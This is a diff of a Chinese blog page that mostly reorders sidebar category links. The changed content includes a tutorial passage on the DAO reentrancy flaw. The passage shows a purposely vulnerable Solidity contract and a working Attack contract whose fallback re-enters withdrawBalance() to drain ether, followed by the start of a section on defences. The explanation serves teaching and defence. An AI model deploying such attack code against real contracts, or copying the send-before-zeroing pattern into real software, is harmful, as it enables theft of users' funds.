@@ -176,14 +176,6 @@ The DAO对此体会深刻。
             
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/Ethereum/">
-                    Ethereum <span class="right">3</span></a>
-                </a>
-            </li>
-
-        
-
-            <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/CTF/">
                     CTF <span class="right">5</span></a>
                 </a>
@@ -208,32 +200,8 @@ The DAO对此体会深刻。
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/Android/">
-                    Android <span class="right">8</span></a>
-                </a>
-            </li>
-
-        
-
-            <li class="collapse-level-1" collapse-level="1">
-                <a class="no-padding" href="/categories/Android/马甲包/">
-                    马甲包 <span class="right">2</span></a>
-                </a>
-            </li>
-
-        
-
-            <li class="collapse-level-1" collapse-level="1">
-                <a class="no-padding" href="/categories/Android/脱壳/">
-                    脱壳 <span class="right">1</span></a>
-                </a>
-            </li>
-
-        
-
-            <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/算法/">
-                    算法 <span class="right">1</span></a>
+                <a class="no-padding" href="/categories/Ethereum/">
+                    Ethereum <span class="right">3</span></a>
                 </a>
             </li>
 
@@ -264,8 +232,32 @@ The DAO对此体会深刻。
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/听戏/">
-                    听戏 <span class="right">5</span></a>
+                <a class="no-padding" href="/categories/算法/">
+                    算法 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Android/">
+                    Android <span class="right">8</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/Android/脱壳/">
+                    脱壳 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/Android/马甲包/">
+                    马甲包 <span class="right">2</span></a>
                 </a>
             </li>
 
@@ -280,6 +272,14 @@ The DAO对此体会深刻。
         
 
             <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/听戏/">
+                    听戏 <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/A简历/">
                     A简历 <span class="right">1</span></a>
                 </a>
@@ -288,16 +288,16 @@ The DAO对此体会深刻。
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/学习记录/">
-                    学习记录 <span class="right">1</span></a>
+                <a class="no-padding" href="/categories/Cpp/">
+                    Cpp <span class="right">1</span></a>
                 </a>
             </li>
 
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/Cpp/">
-                    Cpp <span class="right">1</span></a>
+                <a class="no-padding" href="/categories/学习记录/">
+                    学习记录 <span class="right">1</span></a>
                 </a>
             </li>
 
@@ -412,7 +412,7 @@ The DAO对此体会深刻。
 <p>8.Let the DAO update your balance. Because (7) goes back to (5), it never actually will :-).</p>
 </blockquote>
 <p>其中最关键的就是第4步，payOut使用_recipient.call.value(_amount)()转币，而splitDAO函数中资产重置是放在withdrawRewardFor转币函数后，造成漏洞。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract vulnerable_DAO&#123;</span><br><span class="line">    mapping(address=&gt;uint) userBalances;</span><br><span class="line">    <span class="function">function <span class="title">vulnerable_DAO</span><span class="params">()</span> payable </span>&#123;&#125;</span><br><span class="line">    <span class="function">function <span class="title">getUserBalance</span><span class="params">(address user)</span> constant <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userBalances[user];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">addToBalance</span><span class="params">()</span> payable </span>&#123;</span><br><span class="line">        userBalances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">withdrawBalance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        uint amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span>(msg.sender.call.value(amountToWithdraw)() ==<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        userBalances[msg.sender] = <span class="number">0</span>;  <span class="comment">//这里先throw，再归零</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract vulnerable_DAO &#123;</span><br><span class="line">    mapping(address=&gt;uint) userBalances;</span><br><span class="line">    <span class="function">function <span class="title">vulnerable_DAO</span><span class="params">()</span> payable </span>&#123;&#125;</span><br><span class="line">    <span class="function">function <span class="title">getUserBalance</span><span class="params">(address user)</span> constant <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userBalances[user];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">addToBalance</span><span class="params">()</span> payable </span>&#123;</span><br><span class="line">        userBalances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">withdrawBalance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        uint amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span>(msg.sender.call.value(amountToWithdraw)() ==<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        userBalances[msg.sender] = <span class="number">0</span>;  <span class="comment">//这里先throw，再归零</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address vulnerable_contract;</span><br><span class="line">    uint attackCount;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    <span class="function">function <span class="title">Attack</span><span class="params">()</span> <span class="keyword">public</span></span>&#123;</span><br><span class="line">        attackCount = <span class="number">2</span>;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable&#123;    <span class="comment">//在这里，可以肆意操作一波</span></span><br><span class="line">        <span class="keyword">while</span>(attackCount&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            attackCount--;</span><br><span class="line">            require(vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdrawBalance()"</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">deposit</span><span class="params">(address _vulnerable_contract)</span> <span class="keyword">public</span> payable</span>&#123;</span><br><span class="line">        vulnerable_contract = _vulnerable_contract;</span><br><span class="line">        require(vulnerable_contract.call.value(msg.value)(bytes4(keccak256(<span class="string">"addToBalance()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span></span>&#123;</span><br><span class="line">        require(vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdrawBalance()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="避坑方法"><a href="#避坑方法" class="headerlink" title="避坑方法"></a>避坑方法</h2><p>很多方法都可以帮助避免智能合约中潜在的重新入口漏洞。</p>
 <p>第一种方法是，当发送以太币到外部合约时，使用内置的transfer()函数。Transfer()函数只发送2300个gas，这不足以使目的地址/合约调用另一个合约（例如，重新进入发送中的合约）。</p>
